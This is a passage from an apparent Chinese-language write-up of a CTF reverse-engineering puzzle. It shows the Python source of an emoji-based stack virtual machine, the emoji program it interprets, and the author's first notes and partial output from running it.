class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">if_zero</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> self.stack[<span class="number">-1</span>] == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">while</span> self.rom[self.instruction_pointer] != <span class="string">&#x27;😐&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> self.rom[self.instruction_pointer] <span class="keyword">in</span> [<span class="string">&#x27;🏀&#x27;</span>, <span class="string">&#x27;⛰&#x27;</span>]:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        self.step()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      self.find_first_endif()</span><br><span class="line">      self.instruction_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">if_not_zero</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> self.stack[<span class="number">-1</span>] != <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">while</span> self.rom[self.instruction_pointer] != <span class="string">&#x27;😐&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> self.rom[self.instruction_pointer] <span class="keyword">in</span> [<span class="string">&#x27;🏀&#x27;</span>, <span class="string">&#x27;⛰&#x27;</span>]:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        self.step()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      self.find_first_endif()</span><br><span class="line">      self.instruction_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">find_first_endif</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">while</span> self.rom[self.instruction_pointer] != <span class="string">&#x27;😐&#x27;</span>:</span><br><span class="line">      self.instruction_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">jump_to</span>(<span class="params">self</span>):</span></span><br><span class="line">    marker = self.rom[self.instruction_pointer]</span><br><span class="line">    <span class="keyword">if</span> marker[<span class="number">0</span>] != <span class="string">&#x27;💰&#x27;</span>:</span><br><span class="line">      print(<span class="string">&#x27;Incorrect symbol : &#x27;</span> + marker[<span class="number">0</span>])</span><br><span class="line">      <span class="keyword">raise</span> SystemExit()</span><br><span class="line">    marker = <span class="string">&#x27;🖋&#x27;</span> + marker[<span class="number">1</span>:]</span><br><span class="line">    self.instruction_pointer = self.rom.index(marker) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">jump_top</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.instruction_pointer = self.stack.pop()</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">exit</span>(<span class="params">self</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;\nDone.&#x27;</span>)</span><br><span class="line">    <span class="keyword">raise</span> SystemExit()</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">print_top</span>(<span class="params">self</span>):</span></span><br><span class="line">    sys.stdout.write(chr(self.stack.pop()))</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">push</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> self.rom[self.instruction_pointer] == <span class="string">&#x27;🥇&#x27;</span>:</span><br><span class="line">      self.stack.append(self.accumulator1)</span><br><span class="line">    <span class="keyword">elif</span> self.rom[self.instruction_pointer] == <span class="string">&#x27;🥈&#x27;</span>:</span><br><span class="line">      self.stack.append(self.accumulator2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unknown instruction &#123;&#125; at position &#123;&#125;&#x27;</span>.format(</span><br><span class="line">          self.rom[self.instruction_pointer], str(self.instruction_pointer)))</span><br><span class="line">    self.instruction_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> self.rom[self.instruction_pointer] == <span class="string">&#x27;🥇&#x27;</span>:</span><br><span class="line">      self.accumulator1 = self.stack.pop()</span><br><span class="line">    <span class="keyword">elif</span> self.rom[self.instruction_pointer] == <span class="string">&#x27;🥈&#x27;</span>:</span><br><span class="line">      self.accumulator2 = self.stack.pop()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unknown instruction &#123;&#125; at position &#123;&#125;&#x27;</span>.format(</span><br><span class="line">          self.rom[self.instruction_pointer], str(self.instruction_pointer)))</span><br><span class="line">    self.instruction_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">pop_out</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.stack.pop()</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">load</span>(<span class="params">self</span>):</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.rom[self.instruction_pointer] == <span class="string">&#x27;🥇&#x27;</span>:</span><br><span class="line">      acc = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> self.rom[self.instruction_pointer] == <span class="string">&#x27;🥈&#x27;</span>:</span><br><span class="line">      acc = <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unknown instruction &#123;&#125; at position &#123;&#125;&#x27;</span>.format(</span><br><span class="line">          self.rom[self.instruction_pointer], str(self.instruction_pointer)))</span><br><span class="line">    self.instruction_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> self.rom[self.instruction_pointer] != <span class="string">&#x27;✋&#x27;</span>:</span><br><span class="line">      num = num * <span class="number">10</span> + (ord(self.rom[self.instruction_pointer][<span class="number">0</span>]) - ord(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">      self.instruction_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> acc == <span class="number">1</span>:</span><br><span class="line">      self.accumulator1 = num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      self.accumulator2 = num</span><br><span class="line"></span><br><span class="line">    self.instruction_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">clone</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.stack.append(self.stack[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">multiply</span>(<span class="params">self</span>):</span></span><br><span class="line">    a = self.stack.pop()</span><br><span class="line">    b = self.stack.pop()</span><br><span class="line">    self.stack.append(b * a)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">divide</span>(<span class="params">self</span>):</span></span><br><span class="line">    a = self.stack.pop()</span><br><span class="line">    b = self.stack.pop()</span><br><span class="line">    self.stack.append(b // a)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">modulo</span>(<span class="params">self</span>):</span></span><br><span class="line">    a = self.stack.pop()</span><br><span class="line">    b = self.stack.pop()</span><br><span class="line">    self.stack.append(b % a)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">self</span>):</span></span><br><span class="line">    a = self.stack.pop()</span><br><span class="line">    b = self.stack.pop()</span><br><span class="line">    self.stack.append(b ^ a)</span><br><span class="line"></span><br><span class="line">  OPERATIONS = &#123;</span><br><span class="line">      <span class="string">&#x27;🍡&#x27;</span>: add,</span><br><span class="line">      <span class="string">&#x27;🤡&#x27;</span>: clone,</span><br><span class="line">      <span class="string">&#x27;📐&#x27;</span>: divide,</span><br><span class="line">      <span class="string">&#x27;😲&#x27;</span>: if_zero,</span><br><span class="line">      <span class="string">&#x27;😄&#x27;</span>: if_not_zero,</span><br><span class="line">      <span class="string">&#x27;🏀&#x27;</span>: jump_to,</span><br><span class="line">      <span class="string">&#x27;🚛&#x27;</span>: load,</span><br><span class="line">      <span class="string">&#x27;📬&#x27;</span>: modulo,</span><br><span class="line">      <span class="string">&#x27;⭐&#x27;</span>: multiply,</span><br><span class="line">      <span class="string">&#x27;🍿&#x27;</span>: pop,</span><br><span class="line">      <span class="string">&#x27;📤&#x27;</span>: pop_out,</span><br><span class="line">      <span class="string">&#x27;🎤&#x27;</span>: print_top,</span><br><span class="line">      <span class="string">&#x27;📥&#x27;</span>: push,</span><br><span class="line">      <span class="string">&#x27;🔪&#x27;</span>: sub,</span><br><span class="line">      <span class="string">&#x27;🌓&#x27;</span>: xor,</span><br><span class="line">      <span class="string">&#x27;⛰&#x27;</span>: jump_top,</span><br><span class="line">      <span class="string">&#x27;⌛&#x27;</span>: exit</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">&#x27;Missing program&#x27;</span>)</span><br><span class="line">    <span class="keyword">raise</span> SystemExit()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">with</span> open(sys.argv[<span class="number">1</span>], <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(<span class="string">&#x27;Running ....&#x27;</span>)</span><br><span class="line">    all_ins = [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">    all_ins.extend(f.read().split())</span><br><span class="line">    vm = VM(all_ins)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">      vm.step()</span><br></pre></td></tr></table></figure><ul><li>program</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">🚛 🥇 0️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 7️⃣ 4️⃣ 8️⃣ 8️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 6️⃣ 7️⃣ 5️⃣ 8️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 6️⃣ 5️⃣ 9️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 6️⃣ 2️⃣ 8️⃣ 5️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 6️⃣ 0️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 5️⃣ 5️⃣ 0️⃣ 5️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 5️⃣ 4️⃣ 1️⃣ 7️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 4️⃣ 8️⃣ 3️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 4️⃣ 4️⃣ 5️⃣ 0️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 3️⃣ 8️⃣ 9️⃣ 3️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 3️⃣ 9️⃣ 2️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 3️⃣ 4️⃣ 3️⃣ 7️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 2️⃣ 8️⃣ 3️⃣ 3️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 2️⃣ 7️⃣ 4️⃣ 1️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 2️⃣ 5️⃣ 3️⃣ 3️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 1️⃣ 5️⃣ 0️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 1️⃣ 3️⃣ 4️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 5️⃣ 0️⃣ 3️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 5️⃣ 5️⃣ 0️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 3️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 7️⃣ 5️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 7️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 8️⃣ 9️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 8️⃣ 9️⃣ 3️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 6️⃣ 6️⃣ 0️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 7️⃣ 4️⃣ 3️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 2️⃣ 6️⃣ 7️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 3️⃣ 4️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 2️⃣ 6️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 3️⃣ 3️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 2️⃣ 0️⃣ 8️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 2️⃣ 1️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 2️⃣ 4️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 7️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 7️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 4️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 1️⃣ 3️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥈 1️⃣ ✋</span><br><span class="line"></span><br><span class="line">🖋💠🔶🎌🚩🏁 🍿 🥇 📥 🥈 📥 🥇 🚛 🥇 3️⃣ 8️⃣ 9️⃣ ✋</span><br><span class="line">📥 🥇 📥 🥈</span><br><span class="line">🏀 💰🏁🚩🎌💠🔶</span><br><span class="line">🌓 🎤</span><br><span class="line">🚛 🥇 1️⃣ ✋ 📥 🥇 🍡 🍿 🥈</span><br><span class="line">😄 🏀 💰💠🔶🎌🚩🏁 😐</span><br><span class="line"></span><br><span class="line">🚛 🥇 9️⃣ 8️⃣ 4️⃣ 2️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 7️⃣ 8️⃣ 5️⃣ 0️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 7️⃣ 6️⃣ 0️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 7️⃣ 2️⃣ 8️⃣ 0️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 6️⃣ 8️⃣ 1️⃣ 5️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 6️⃣ 4️⃣ 4️⃣ 3️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 6️⃣ 3️⃣ 5️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 5️⃣ 9️⃣ 3️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 4️⃣ 8️⃣ 6️⃣ 5️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 4️⃣ 9️⃣ 5️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 4️⃣ 6️⃣ 6️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 4️⃣ 4️⃣ 4️⃣ 0️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 3️⃣ 9️⃣ 6️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 3️⃣ 7️⃣ 6️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥈 9️⃣ 9️⃣ ✋</span><br><span class="line"></span><br><span class="line">🖋💠🏁🎌🔶🚩 🍿 🥇 📥 🥈 📥 🥇 🚛 🥇 5️⃣ 6️⃣ 8️⃣ ✋</span><br><span class="line">📥 🥇 📥 🥈</span><br><span class="line">🏀 💰🏁🚩🎌💠🔶</span><br><span class="line">🌓 🎤</span><br><span class="line">🚛 🥇 1️⃣ ✋ 📥 🥇 🍡 🍿 🥈</span><br><span class="line">😄 🏀 💰💠🏁🎌🔶🚩 😐</span><br><span class="line"></span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 1️⃣ 1️⃣ 4️⃣ 1️⃣ 0️⃣ 5️⃣ 8️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 1️⃣ 0️⃣ 6️⃣ 0️⃣ 2️⃣ 0️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 1️⃣ 0️⃣ 3️⃣ 0️⃣ 0️⃣ 5️⃣ 5️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 9️⃣ 9️⃣ 8️⃣ 9️⃣ 6️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 8️⃣ 8️⃣ 7️⃣ 9️⃣ 9️⃣ 0️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 7️⃣ 6️⃣ 7️⃣ 0️⃣ 8️⃣ 5️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 7️⃣ 0️⃣ 7️⃣ 0️⃣ 3️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 6️⃣ 5️⃣ 6️⃣ 1️⃣ 1️⃣ 1️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 4️⃣ 0️⃣ 4️⃣ 0️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 1️⃣ 6️⃣ 0️⃣ 9️⃣ 2️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 1️⃣ 3️⃣ 1️⃣ 0️⃣ 1️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 1️⃣ 1️⃣ 1️⃣ 1️⃣ 0️⃣ 0️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 0️⃣ 5️⃣ 9️⃣ 9️⃣ 2️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 0️⃣ 4️⃣ 9️⃣ 9️⃣ 8️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 1️⃣ 0️⃣ 0️⃣ 0️⃣ 3️⃣ 0️⃣ 0️⃣ 4️⃣ 5️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 8️⃣ 9️⃣ 9️⃣ 9️⃣ 7️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 8️⃣ 1️⃣ 8️⃣ 5️⃣ 8️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 8️⃣ 0️⃣ 8️⃣ 1️⃣ 5️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 7️⃣ 8️⃣ 8️⃣ 4️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 6️⃣ 5️⃣ 7️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 5️⃣ 7️⃣ 5️⃣ 6️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 3️⃣ 8️⃣ 3️⃣ 0️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 3️⃣ 5️⃣ 4️⃣ 2️⃣ 7️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 3️⃣ 2️⃣ 2️⃣ 8️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 3️⃣ 1️⃣ 4️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 2️⃣ 7️⃣ 3️⃣ 8️⃣ 8️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 2️⃣ 6️⃣ 3️⃣ 7️⃣ 6️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 2️⃣ 3️⃣ 2️⃣ 1️⃣ 3️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 2️⃣ 1️⃣ 3️⃣ 9️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 1️⃣ 9️⃣ 1️⃣ 5️⃣ 4️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 1️⃣ 8️⃣ 0️⃣ 8️⃣ 2️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥇 9️⃣ 9️⃣ 1️⃣ 6️⃣ 2️⃣ 3️⃣ 9️⃣ ✋ 📥 🥇</span><br><span class="line">🚛 🥈 7️⃣ 6️⃣ 5️⃣ ✋</span><br><span class="line"></span><br><span class="line">🖋🚩💠🎌🔶🏁 🍿 🥇 📥 🥈 📥 🥇 🚛 🥇 1️⃣ 0️⃣ 2️⃣ 3️⃣ ✋</span><br><span class="line">📥 🥇 📥 🥈</span><br><span class="line">🏀 💰🏁🚩🎌💠🔶</span><br><span class="line">🌓 🎤</span><br><span class="line">🚛 🥇 1️⃣ ✋ 📥 🥇 🍡 🍿 🥈</span><br><span class="line">😄 🏀 💰🚩💠🎌🔶🏁 😐</span><br><span class="line">⌛</span><br><span class="line"></span><br><span class="line">🖋🏁🚩🎌💠🔶</span><br><span class="line">🚛 🥇 2️⃣ ✋ 📥 🥇 🖋💠🎌🏁🚩🔶</span><br><span class="line">🏀 💰🚩🔶🏁🎌💠</span><br><span class="line">🖋🔶🎌🚩💠🏁 😲 📤 🏀 💰🔶🚩💠🏁🎌 ✋ 😐</span><br><span class="line">📤 🏀 💰🎌🏁💠🔶🚩</span><br><span class="line">🖋🎌🏁🚩🔶💠 😲 📤 🏀 💰🔶🚩💠🏁🎌 😐</span><br><span class="line">📤 🍿 🥇 🚛 🥈 1️⃣ ✋ 📥 🥈 🔪</span><br><span class="line">😲 📤 🍿 🥈 📥 🥇 📥 🥈 ⛰ 😐 📥 🥇</span><br><span class="line">🖋🔶🚩💠🏁🎌 🚛 🥈 1️⃣ ✋ 📥 🥈 🍡 🏀 💰💠🎌🏁🚩🔶</span><br><span class="line"></span><br><span class="line">🖋🚩🔶🏁🎌💠</span><br><span class="line">🤡 🚛 🥇 2️⃣ ✋ 📥 🥇</span><br><span class="line">🖋🎌🚩💠🔶🏁 🔪 😲 📤 🚛 🥇 1️⃣ ✋ 📥 🥇</span><br><span class="line">🏀 💰🔶🎌🚩💠🏁 😐</span><br><span class="line">📤 🤡 📥 🥇</span><br><span class="line">📬 😲 🏀 💰🔶🎌🚩💠🏁 😐</span><br><span class="line">📤 🤡 📥 🥇 🚛 🥇 1️⃣ ✋</span><br><span class="line">📥 🥇 🍡 🤡 🍿 🥇 🏀 💰🎌🚩💠🔶🏁</span><br><span class="line"></span><br><span class="line">🖋🎌🏁💠🔶🚩</span><br><span class="line">🤡 🤡 🚛 🥈 0️⃣ ✋ 📥 🥈</span><br><span class="line">🖋🏁💠🔶🚩🎌 🚛 🥇 1️⃣ 0️⃣ ✋ 📥 🥇</span><br><span class="line">⭐ 🍿 🥈 📥 🥇 📬</span><br><span class="line">📥 🥈 🍡 🍿 🥈 🍿 🥇 🤡 📥 🥈 🔪</span><br><span class="line">😲 📤 🚛 🥈 1️⃣ ✋ 📥 🥈 🏀 💰🎌🏁🚩🔶💠 😐</span><br><span class="line">📤 📥 🥇 🚛 🥇 1️⃣ 0️⃣ ✋ 📥 🥇 📐</span><br><span class="line">😲 🏀 💰🎌🏁🚩🔶💠 😐</span><br><span class="line">🤡 📥 🥈 🏀 💰🏁💠🔶🚩🎌</span><br></pre></td></tr></table></figure><ul><li>尝试使用vm.py将program 转换成代码形式，速度太慢，应该是一个错误的思路</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">╭─r10@GSCR10 /mnt/c/Users/R10/Desktop/google ctf/ctf/06_FriendSpaceBookPlusAllAccessRedPremium.com</span><br><span class="line">╰─➤  python3 vm.py program</span><br><span class="line">Running ....</span><br><span class="line">http://emoji-t0anaxnr3nacpt4n</span><br></pre></td></tr></table></figure><ul><li>分析vm.py,实现了基于堆栈的相关算法。</li><li>分析得到rom为输入数据，从program中获取，分为3段</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 